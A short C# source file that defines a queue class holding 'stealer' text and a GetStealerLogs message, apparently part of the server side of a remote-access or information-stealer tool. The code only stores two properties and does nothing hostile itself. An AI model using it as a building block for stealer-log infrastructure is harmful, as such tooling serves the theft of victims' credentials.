

using InvokedCommon.Messages;


namespace InvokedServer.Messages
{
	public class StealerLogQueueClass
	{
		public string StealerText { get; set; }

		public GetStealerLogs StealerLogsMsg { get; set; }

		public StealerLogQueueClass(string stealerText, GetStealerLogs stealerLogsMsg)
		{
			this.StealerText = stealerText;
			this.StealerLogsMsg = stealerLogsMsg;
		}
	}
}